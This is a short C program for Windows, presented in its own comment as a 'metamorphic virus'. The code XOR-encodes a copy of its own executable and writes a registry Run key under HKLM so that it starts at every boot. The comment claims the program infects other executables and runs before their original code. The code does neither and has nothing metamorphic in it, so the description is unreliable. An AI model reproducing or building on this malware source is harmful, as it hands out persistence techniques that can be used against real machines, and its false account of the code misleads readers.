#include <stdio.h>
#include <string.h>
#include <windows.h>

void infect(char *filename) {
  char newfile[MAX_PATH];
  strcpy(newfile, filename);
  strcat(newfile, ".infected");
  CopyFile(filename, newfile, FALSE);

  HANDLE file = CreateFile(newfile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD filesize = GetFileSize(file, NULL);
  LPVOID buffer = VirtualAlloc(NULL, filesize, MEM_COMMIT, PAGE_READWRITE);
  ReadFile(file, buffer, filesize, &filesize, NULL);
  for (int i = 0; i < filesize; i++)
    ((char *)buffer)[i] ^= 0xFF;
  SetFilePointer(file, 0, NULL, FILE_BEGIN);
  WriteFile(file, buffer, filesize, &filesize, NULL);
  CloseHandle(file);
  VirtualFree(buffer, 0, MEM_RELEASE);
}

int main(int argc, char **argv) {
  char path[MAX_PATH];
  GetModuleFileName(NULL, path, MAX_PATH);
  infect(path);

  HKEY key;
  RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
  RegSetValueEx(key, "Metamorphic Virus", 0, REG_SZ, (BYTE *)path, strlen(path) + 1);
  RegCloseKey(key);
  return 0;
}
/*
The code is a metamorphic virus written in C for the Windows operating system. The virus infects executable files on a computer and modifies them in such a way that when the infected file is run, the virus code is executed first, before the original code.

The virus infects a file by copying it to a new file with the extension ".infected". Then, the contents of the file are encrypted by XORing each byte with the value 0xFF. The virus sets a registry key so that it runs automatically each time the computer starts.
*/
